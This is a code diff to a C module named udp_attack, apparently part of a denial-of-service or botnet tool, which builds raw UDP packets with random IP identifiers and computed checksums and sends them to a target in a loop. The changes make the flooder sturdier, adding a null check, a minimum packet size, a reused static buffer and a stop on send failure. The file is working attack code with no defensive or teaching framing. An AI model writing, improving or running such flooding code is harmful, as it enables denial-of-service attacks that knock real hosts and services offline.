@@ -1,5 +1,5 @@
-#include "udp_attack.h"
-#include "checksum.h"
+#include "headers/udp_attack.h"
+#include "headers/checksum.h"
 #include <string.h>
 #include <stdlib.h>
 #include <arpa/inet.h>
@@ -11,6 +11,7 @@
 
 void* udp_attack(void* arg) {
     attack_params* params = (attack_params*)arg;
+    if (!params) return NULL;
 
     int udp_sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
     if (udp_sock < 0) {
@@ -24,13 +25,21 @@ void* udp_attack(void* arg) {
         return NULL;
     }
 
+    int min_packet_size = sizeof(struct iphdr) + sizeof(struct udphdr);
     int packet_size = params->psize > 0 ? params->psize : 32;
-    unsigned char *packet = malloc(packet_size);
-    if (!packet) {
-        close(udp_sock);
-        return NULL;
+    if (packet_size < min_packet_size) packet_size = min_packet_size;
+    static unsigned char *packet = NULL;
+    static int last_packet_size = 0;
+    if (packet == NULL || last_packet_size != packet_size) {
+        if (packet) free(packet);
+        packet = malloc(packet_size);
+        if (!packet) {
+            close(udp_sock);
+            return NULL;
+        }
+        memset(packet, 0, min_packet_size); 
+        last_packet_size = packet_size;
     }
-    memset(packet, 0x00, packet_size);
 
     struct iphdr* iph = (struct iphdr*)packet;
     struct udphdr* udph = (struct udphdr*)(packet + sizeof(struct iphdr));
@@ -62,10 +71,10 @@ void* udp_attack(void* arg) {
         iph->id = htons(rand() % 65535);
         iph->check = generic_checksum((unsigned short*)iph, sizeof(struct iphdr));
         udph->check = tcp_udp_checksum(udph, packet_size - sizeof(struct iphdr), iph->saddr, iph->daddr, IPPROTO_UDP);
-        sendto(udp_sock, packet, packet_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
+        ssize_t sent = sendto(udp_sock, packet, packet_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
+        if (sent < 0) break;
     }
 
-    free(packet);
     close(udp_sock);
     return NULL;
 }
